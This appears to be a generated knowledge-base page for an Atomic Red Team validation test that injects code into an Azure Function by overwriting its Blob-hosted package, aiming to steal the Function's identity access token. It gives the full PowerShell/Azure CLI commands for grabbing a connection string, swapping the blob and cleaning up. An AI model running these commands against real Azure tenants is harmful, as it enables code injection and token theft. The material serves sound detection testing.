---
atomic_guid: "9a5352e4-56e5-45c2-9b3f-41a46d3b3a43"
title: "Azure - Functions code upload - Functions code injection via Blob upload"
framework: "atomic"
generated: "true"
attack_technique_id: "T1528"
attack_technique_name: "Steal Application Access Token"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "9a5352e4-56e5-45c2-9b3f-41a46d3b3a43"
  - "Azure - Functions code upload - Functions code injection via Blob upload"
platforms:
  - "iaas:azure"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Azure - Functions code upload - Functions code injection via Blob upload

This test injects code into an Azure Function (RCE).

Attack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/

Similar to T1528 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.

Note:
- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). 
- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1528 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token".
- The required input fields can be retrieved in a reconnaissance step in test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". The code of function apps may be inspected and prepared from the result of test T1530 "Azure - Dump Azure Storage Account Objects via Azure CLI".

Requirements:
- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
- The EntraID user must have the role "Storage Account Contributor", or a role with similar permissions.

## Metadata

- Atomic GUID: 9a5352e4-56e5-45c2-9b3f-41a46d3b3a43
- Technique: T1528: Steal Application Access Token
- Platforms: iaas:azure
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1528/T1528.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1528-steal_application_access_token|T1528]]

## Input Arguments

### blob_name

- description: Name of the function blob
- type: string
- default: blob_example

### container_name

- description: Name of the container that contains the function blob
- type: string
- default: container_name_example

### file_path_blob

- description: Path to the function code file to upload as blob
- type: path
- default: $env:temp/T1528_function_code.zip

### storage_account_name

- description: Name of storage account that is related to the Function
- type: string
- default: storage_account_name_example

## Dependencies

Azure CLI must be installed

### Prerequisite Check

```text
try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name Az -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name "#{storage_account_name}" --query "allowSharedKeyAccess"

if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
    Write-Output "Shared key access is disabled for this storage account."
} else {    
    $connectionString = az storage account show-connection-string --name "#{storage_account_name}" --query connectionString --output tsv

    # Download blob for cleanup
    $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + "#{blob_name}")
    az storage blob download --connection-string $connectionString --container-name "#{container_name}" --name "#{blob_name}" --file $tmpOriginalFunctionCode --overwrite true

    if ($LASTEXITCODE -eq 0) {
        # Upload new blob version if download of existing blob succeeded
        az storage blob upload --connection-string $connectionString --container-name "#{container_name}" --name "#{blob_name}" --file "#{file_path_blob}" --overwrite true
    } else {
        Write-Output "Download original function code failed."
        exit 1
    }
}
```

### Cleanup

```powershell
az login    # Log in to Azure CLI

# Upload previous funciton code
$tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + "#{blob_name}")
az storage blob upload --account-name "#{storage_account_name}" --container-name "#{container_name}" --file $tmpOriginalFunctionCode --name "#{blob_name}" --overwrite true 2>$null

if ($LASTEXITCODE -eq 0) {
    Write-Output "Uploaded original version of function code."

    # Delete tmp original blob file if upload succeeded
    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
    Write-Output "Deleted tmp original blob file: $($tmpOriginalFunctionCode)"
} else {
    Write-Output "Upload original function code failed."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.yaml)
